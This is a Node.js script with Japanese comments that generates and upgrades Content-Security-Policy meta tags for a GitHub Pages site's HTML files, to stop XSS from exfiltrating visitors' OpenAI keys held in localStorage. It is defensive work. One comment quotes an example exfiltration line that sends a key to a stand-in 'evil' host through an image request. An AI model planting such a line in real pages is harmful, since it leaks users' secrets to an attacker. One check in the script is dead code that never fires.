#!/usr/bin/env node
// 全ページに Content-Security-Policy を入れる。
//
// **なぜ要るか**
// localStorage は**オリジンごと**に共有される。このサイトは99ページ全部が
// `hifukasawa77-lgtm.github.io` という1つのオリジンなので、**どれか1ページに
// XSS があれば、ZERO-1 Mobile が預かっている訪問者のOpenAIキーが読める**。
// 2026-09-08 時点で CSP を持つのは 19/99 ページだけだった。
//
// ★**いちばん効くのは connect-src / img-src / form-action。**
//   このサイトのゲームは中身が全部インラインscriptなので `'unsafe-inline'` を
//   外せない＝XSSの実行自体は止められない。だが**持ち出しは止められる**:
//   fetch も `new Image().src='https://evil/?'+key` も form の送信も、
//   宛先が許可リストに無ければブラウザが止める。鍵を守るのはここ。
//
// ★**方針は「そのページが実際に読み込んでいるものだけ」を許す。**
//   ファイル内に出てくる https:// を全部足すと、`<a href>` のリンク先
//   （twitter.com・Wikipedia・各種ドキュメント）まで許可することになり、
//   守りが穴だらけになる。リンクは CSP の対象外なので足さない。
//
// ★**入れたら実物で確かめる。** CSP は違反しても**画面に何も出ない**まま
//   絵や音や通信だけが消える。scripts/verify-csp.mjs が実際にブラウザで
//   開いて違反を拾う。生成だけして確かめないなら、入れない方がまだましである。

import { readFileSync, writeFileSync } from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");

/**
 * そのページが読む**ローカルCSSの中身**も足して1つの文字列にする。
 *
 * ★CSS の `@import url('https://fonts.googleapis.com/...')` は、HTMLだけ見ても
 *   絶対に見つからない。battle.html はこの形でフォントを読んでおり、
 *   HTMLしか見ない生成では**無言でフォントが当たらないページ**になった
 *   （2026-09-08、実物で開いて初めて判明）。
 */
export function withLinkedCss(html, dir, read) {
  let combined = html;
  for (const [, href] of html.matchAll(/<link\b[^>]*\bhref\s*=\s*["']([^"':]+\.css)["']/gi)) {
    try { combined += "\n" + read(path.join(dir, href)); } catch { /* 読めなければ足さない */ }
  }
  return combined;
}

/** 資源として読み込む参照だけを拾う（リンクは拾わない） */
export function collectResourceOrigins(html) {
  const found = { script: new Set(), style: new Set(), img: new Set(), font: new Set(), connect: new Set(), media: new Set(), frame: new Set() };
  const origin = (url) => { try { return new URL(url).origin; } catch { return ""; } };

  // <script src>
  for (const [, url] of html.matchAll(/<script\b[^>]*\bsrc\s*=\s*["'](https?:\/\/[^"']+)["']/gi)) {
    const o = origin(url); if (o) found.script.add(o);
  }
  // <link rel=stylesheet href>。**属性の順番に依存しない**——`href` が先の書き方が
  // 実在し（calculator.html 等）、rel を先に要求する正規表現だと拾えず、
  // Webフォントが**無言で当たらないページ**になる（2026-09-08 実測で判明）。
  // preconnect は足さない（宛先が要るのは実読込のみ）
  for (const [, tag] of html.matchAll(/(<link\b[^>]*>)/gi)) {
    if (!/\brel\s*=\s*["'][^"']*stylesheet/i.test(tag)) continue;
    const href = tag.match(/\bhref\s*=\s*["'](https?:\/\/[^"']+)["']/i);
    const o = href ? origin(href[1]) : ""; if (o) found.style.add(o);
  }
  // <img src> / <source src> / CSS の url()
  for (const [, url] of html.matchAll(/<(?:img|source)\b[^>]*\bsrc\s*=\s*["'](https?:\/\/[^"']+)["']/gi)) {
    const o = origin(url); if (o) found.img.add(o);
  }
  // ★`@import url(...)` は**スタイル**。ここを url() と一緒くたに img へ入れると、
  //   style-src に載らず**フォントが無言で当たらない**（battle.css で実際に起きた）
  for (const [, url] of html.matchAll(/@import\s+url\(\s*["']?(https?:\/\/[^"')]+)["']?\s*\)/gi)) {
    const o = origin(url); if (o) found.style.add(o);
  }
  for (const [, url] of html.matchAll(/url\(\s*["']?(https?:\/\/[^"')]+)["']?\s*\)/gi)) {
    if (/@import\s+url\(\s*["']?$/.test("")) continue;
    const o = origin(url); if (!o) continue;
    // フォント本体と画像を分ける（font-src と img-src は別の指示）
    if (/\.(woff2?|ttf|otf|eot)(\?|$)/i.test(url)) found.font.add(o); else found.img.add(o);
  }
  // <iframe src>
  for (const [, url] of html.matchAll(/<iframe\b[^>]*\bsrc\s*=\s*["'](https?:\/\/[^"']+)["']/gi)) {
    const o = origin(url); if (o) found.frame.add(o);
  }
  // fetch( / XMLHttpRequest.open( / new WebSocket( / EventSource(
  for (const [, url] of html.matchAll(/(?:fetch|EventSource|WebSocket)\s*\(\s*["'`](https?:\/\/[^"'`]+)/gi)) {
    const o = origin(url); if (o) found.connect.add(o);
  }
  for (const [, url] of html.matchAll(/\.open\s*\(\s*["'][A-Z]+["']\s*,\s*["'`](https?:\/\/[^"'`]+)/gi)) {
    const o = origin(url); if (o) found.connect.add(o);
  }
  // 実行時に組み立てる宛先（`https://` から始まる文字列を変数へ入れて後で fetch する形）は
  // 静的には辿れない。**だから verify-csp.mjs が実物で確かめる**（ここだけでは足りない）
  for (const [, url] of html.matchAll(/["'`](https:\/\/[a-z0-9.-]+\.workers\.dev[^"'`]*)["'`]/gi)) {
    const o = origin(url); if (o) found.connect.add(o);
  }
  // Google Fonts のCSSは gstatic からフォント本体を引く（必ず対で要る）
  if ([...found.style].some((o) => o.includes("fonts.googleapis.com"))) found.font.add("https://fonts.gstatic.com");
  return found;
}

/**
 * `new Function` / `eval` を使っているか。
 *
 * ★将棋・囲碁・チェスは、思考ルーチンの文字列を Worker と**同じ糸の予備**の
 *   両方で使うため `new Function(ENGINE_SRC)` を通す。CSP で止めると
 *   try/catch に落ちて `...SearchSync=null` になり、**例外も出ないまま
 *   予備の思考だけが消える**（Worker が使えない環境で対局できなくなる）。
 *   そのページだけ 'unsafe-eval' を許す。**鍵を守っているのは connect-src
 *   なので、ここを許しても持ち出しは止まったまま**（script-src はどのみち
 *   'unsafe-inline' で、XSSの実行自体はもともと止められていない）。
 */
export function usesDynamicCode(html) {
  return /\bnew\s+Function\s*\(|(?<![.\w$])eval\s*\(/.test(html);
}

/** 許可リストから CSP の文字列を組む */
export function buildCsp(found, { dynamicCode = false } = {}) {
  const list = (base, set) => [...base, ...[...set].sort()].join(" ");
  const parts = [
    `default-src 'self'`,
    // ゲームは中身がインラインscript。外せないので、代わりに持ち出しを塞ぐ
    `script-src ${list(dynamicCode ? ["'self'", "'unsafe-inline'", "'unsafe-eval'"] : ["'self'", "'unsafe-inline'"], found.script)}`,
    `style-src ${list(["'self'", "'unsafe-inline'"], found.style)}`,
    `img-src ${list(["'self'", "data:", "blob:"], found.img)}`,
    `font-src ${list(["'self'", "data:"], found.font)}`,
    // ★ここが鍵を守る本体。許可した宛先以外へは送れない
    `connect-src ${list(["'self'"], found.connect)}`,
    `media-src ${list(["'self'", "data:", "blob:"], found.media)}`,
    `worker-src 'self' blob:`,
    `object-src 'none'`,
    `base-uri 'self'`,
    // ★form の送信も持ち出しの経路。塞ぐ
    `form-action ${list(["'self'"], new Set())}`,
  ];
  if (found.frame.size) parts.push(`frame-src ${list(["'self'"], found.frame)}`);
  return parts.join("; ");
}

const META = (csp) => `<meta http-equiv="Content-Security-Policy" content="${csp}">`;

/**
 * 既にある CSP を、**壊さずに補う**。手で絞った connect-src 等はそのまま残し、
 * 抜けている守り（base-uri / form-action / object-src）と、そのページが実際に
 * 読み込んでいる宛先だけを足す。
 *
 * ★既存を丸ごと作り直さない。zero-1-mobile.html のように手で絞ったものを
 *   自動生成で上書きすると、**緩くなったことに誰も気づかない**。
 */
export function upgradeCsp(csp, found, { dynamicCode = false } = {}) {
  const parts = csp.split(";").map((part) => part.trim()).filter(Boolean);
  const at = (name) => parts.findIndex((part) => part === name || part.startsWith(`${name} `));
  const add = (name, values) => {
    const index = at(name);
    if (index < 0) { parts.push(`${name} ${values.join(" ")}`); return; }
    const have = new Set(parts[index].split(/\s+/).slice(1));
    const missing = values.filter((value) => !have.has(value));
    if (missing.length) parts[index] = `${parts[index]} ${missing.join(" ")}`;
  };
  if (at("base-uri") < 0) parts.push("base-uri 'self'");
  if (at("form-action") < 0) parts.push("form-action 'self'");
  if (at("object-src") < 0) parts.push("object-src 'none'");
  if (dynamicCode) add("script-src", ["'unsafe-eval'"]);
  if (found.script.size) add("script-src", [...found.script]);
  if (found.style.size) add("style-src", [...found.style]);
  if (found.font.size) add("font-src", [...found.font]);
  if (found.img.size) add("img-src", [...found.img]);
  if (found.connect.size) add("connect-src", [...found.connect]);
  return parts.join("; ");
}

/** 1ページぶん。既にあるものは補い、無いものは作る */
export function applyCsp(html, { dir = ROOT, read = (file) => readFileSync(file, "utf8") } = {}) {
  const full = withLinkedCss(html, dir, read);
  const found = collectResourceOrigins(full);
  const dynamicCode = usesDynamicCode(full);

  const existing = html.match(/<meta[^>]*http-equiv=(["'])Content-Security-Policy\1[^>]*>/i);
  if (existing) {
    const current = existing[0].match(/content=(["'])((?:(?!\1)[\s\S])*)\1/i);
    if (!current) return { html, changed: false, reason: "CSPの中身が読めない" };
    const next = upgradeCsp(current[2].replace(/\s+/g, " ").trim(), found, { dynamicCode });
    if (next === current[2].replace(/\s+/g, " ").trim()) return { html, changed: false, reason: "補うところが無い" };
    return { html: html.replace(existing[0], META(next)), changed: true, csp: next, upgraded: true };
  }

  const csp = buildCsp(found, { dynamicCode });
  // charset の直後へ入れる（CSPは早いほどよい。body の後ろだと効かない）
  const charset = html.match(/<meta[^>]*charset[^>]*>/i);
  if (!charset) return { html, changed: false, reason: "charset が無く、入れる位置を決められない" };
  const at = html.indexOf(charset[0]) + charset[0].length;
  return { html: `${html.slice(0, at)}\n${META(csp)}${html.slice(at)}`, changed: true, csp };
}

if (import.meta.url === `file://${path.resolve(process.argv[1] ?? "")}`) {
  const { readdirSync } = await import("node:fs");
  const files = readdirSync(ROOT).filter((name) => name.endsWith(".html"));
  const dryRun = process.argv.includes("--dry-run");
  let added = 0, skipped = 0;
  for (const name of files) {
    const file = path.join(ROOT, name);
    const result = applyCsp(readFileSync(file, "utf8"));
    if (!result.changed) { skipped += 1; continue; }
    if (!dryRun) writeFileSync(file, result.html, "utf8");
    added += 1;
    console.log(`${result.upgraded ? "↑" : "+"} ${name}\n    ${result.csp}`);
  }
  console.log(`\n追加・補い ${added}件 / 触らず ${skipped}件${dryRun ? "（--dry-run なので書いていない）" : ""}`);
  console.log("★入れたら必ず node scripts/verify-csp.mjs で実物を確かめること");
}
